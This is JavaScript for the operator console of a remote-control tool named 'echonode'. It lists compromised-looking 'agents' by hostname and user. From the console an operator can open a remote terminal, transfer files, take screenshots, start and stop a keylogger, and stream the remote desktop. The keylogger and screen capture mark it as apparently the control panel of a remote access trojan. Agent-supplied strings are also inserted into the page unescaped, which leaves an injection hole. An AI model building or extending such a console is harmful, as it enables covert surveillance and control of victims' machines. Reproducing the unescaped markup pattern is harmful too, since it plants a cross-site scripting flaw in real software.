const $ = id => document.getElementById(id);
let currentAgentId = "";
window._agentHosts = {};

function showLogin() {
  $("login-view").classList.remove("hidden");
  $("main-view").classList.add("hidden")
}

function showMain() {
  $("login-view").classList.add("hidden");
  $("main-view").classList.remove("hidden");
  Ws.connect();
  refreshAgents()
}
async function refreshAgents() {
  try {
    const agents = await Api.agents();
    renderAgents(agents)
  } catch (e) {
    if (e.message === "unauthorized") showLogin()
  }
}

function renderAgents(agents) {
  const box = $("machine-cards");
  box.innerHTML = "";
  $("agents-empty").classList.toggle("hidden", agents.length > 0);
  for (const a of agents) {
    window._agentHosts[a.agentId] = a.hostname;
    const card = document.createElement("div");
    card.className = "machine-card" + (a.agentId === currentAgentId ? " selected" : "");
    card.dataset.agent = a.agentId;
    card.innerHTML = `<div class="mc-host"><span class="dot"></span>${a.hostname}</div>` + `<div class="mc-meta">${a.osName}${a.osVersion}·${a.userName}</div>`;
    card.onclick = () => selectAgent(a.agentId);
    box.appendChild(card)
  }
  document.querySelectorAll("#terminal-tabs .tab").forEach(t => {
    t.textContent = window._agentHosts[t.dataset.agent] || t.dataset.agent.slice(0, 8)
  })
}

function selectAgent(agentId) {
  currentAgentId = agentId;
  document.querySelectorAll(".machine-card").forEach(c => {
    c.classList.toggle("selected", c.dataset.agent === agentId)
  });
  $("header-agent").textContent = "当前机器: " + (window._agentHosts[agentId] || agentId);
  TermPanel.open(agentId);
  History.refresh();
  SysInfo.refresh();
  if (DesktopPanel.isVisible()) DesktopPanel.open(agentId)
}
$("login-form").addEventListener("submit", async e => {
  e.preventDefault();
  $("login-error").classList.add("hidden");
  try {
    await Api.login($("login-user").value, $("login-pass").value);
    showMain()
  } catch (err) {
    $("login-error").textContent = "用户名或密码错误";
    $("login-error").classList.remove("hidden")
  }
});
$("logout-btn").addEventListener("click", () => {
  Api.token = "";
  localStorage.removeItem("echonode_token");
  showLogin()
});
if (Api.token) showMain();
else showLogin();
setInterval(() => {
  if (Api.token && !$("main-view").classList.contains("hidden")) refreshAgents()
}, 3000);
Ws.onMessage(msg => TermPanel.onMessage(msg));
Ws.onMessage(msg => Files.onMessage(msg));
Ws.onBinary(frame => Files.onBinary(frame));
$("file-download-btn").addEventListener("click", () => {
  const p = $("file-path").value.trim();
  if (p && currentAgentId) Files.download(currentAgentId, p)
});
$("file-upload-btn").addEventListener("click", () => {
  const f = $("file-input").files[0];
  const rp = $("file-remote-path").value.trim();
  if (f && rp && currentAgentId) Files.upload(currentAgentId, f, rp)
});
Ws.onMessage(msg => Shots.onMessage(msg));
Ws.onBinary(frame => Shots.onBinary(frame));
$("shot-btn").addEventListener("click", () => {
  if (currentAgentId) Shots.capture(currentAgentId)
});
Ws.onMessage(msg => SysInfo.onMessage(msg));
$("sysinfo-btn").addEventListener("click", () => {
  if (currentAgentId) SysInfo.refresh()
});
Ws.onMessage(msg => Keylog.onMessage(msg));
$("keylog-start-btn").addEventListener("click", () => {
  if (currentAgentId) Keylog.start(currentAgentId)
});
$("keylog-stop-btn").addEventListener("click", () => {
  if (currentAgentId) Keylog.stop(currentAgentId)
});
$("keylog-clear-btn").addEventListener("click", () => Keylog.clear());
Ws.onMessage(msg => DesktopPanel.onMessage(msg));
Ws.onBinary(frame => DesktopPanel.onBinary(frame));
$("desk-start-btn").addEventListener("click", () => {
  if (currentAgentId) DesktopPanel.start(currentAgentId)
});
$("desk-stop-btn").addEventListener("click", () => {
  if (currentAgentId) DesktopPanel.stop(currentAgentId)
});
$("desk-fps").addEventListener("change", () => {
  if (currentAgentId && DesktopPanel.streams[currentAgentId]) DesktopPanel.start(currentAgentId)
});
document.querySelectorAll("#center-tabs .ctab").forEach(b => {
  b.addEventListener("click", () => {
    document.querySelectorAll("#center-tabs .ctab").forEach(x => x.classList.toggle("active", x === b));
    const view = b.dataset.view;
    $("terminal-view-wrap").classList.toggle("hidden", view !== "terminal");
    $("desktop-view").classList.toggle("hidden", view !== "desktop");
    if (view === "desktop" && currentAgentId) {
      DesktopPanel.open(currentAgentId)
    } else {
      for (const aid of Object.keys(DesktopPanel.streams)) DesktopPanel.stop(aid)
    }
  })
});

function setupGutter(gutterId, cssVar, minPx, isRight) {
  const gutter = $(gutterId);
  gutter.addEventListener("mousedown", e => {
    e.preventDefault();
    gutter.classList.add("dragging");
    const startPos = e.clientX;
    const root = document.documentElement;
    const startW = parseInt(getComputedStyle(root).getPropertyValue(cssVar)) || 240;
    const onMove = ev => {
      const delta = isRight ? (startPos - ev.clientX) : (ev.clientX - startPos);
      const w = Math.max(minPx, Math.min(startW + delta, window.innerWidth - 500));
      root.style.setProperty(cssVar, w + "px")
    };
    const onUp = () => {
      gutter.classList.remove("dragging");
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp)
    };
    document.addEventListener("mousemove", onMove);
    document.addEventListener("mouseup", onUp)
  })
}
setupGutter("gutter-left", "--left-w", 180, false);
setupGutter("gutter-right", "--right-w", 240, true);